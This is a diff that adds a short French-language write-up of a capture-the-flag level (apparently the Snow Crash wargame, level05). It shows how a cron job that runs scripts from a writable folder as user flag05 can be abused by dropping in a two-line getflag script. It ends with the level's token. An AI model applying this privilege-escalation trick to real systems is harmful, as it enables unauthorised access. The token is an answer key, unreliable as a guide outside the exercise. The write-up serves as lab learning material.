@@ -1,0 +1,19 @@
+On remarque tout de suite qu'on a un mail ! avec un belle ligne
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+c'est un ligne de cron qui execute cette commande toutes les deux minutes en tant que flag05
+
+dans le script on voit:
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+donc ca execute tout les scriptes dans /opt/openarenaserveur/ puis les supprime
+on a donc just a mettre un script dans ce dossier:
+getflag > /tmp/result
+chmod 777 /tmp/result
+
+un fois que le script est suprime de /opt/openarenaserveur/ on peut aller verifier notre dossier avec le token
+token level 05 => viuaaale9huek52boumoomioc
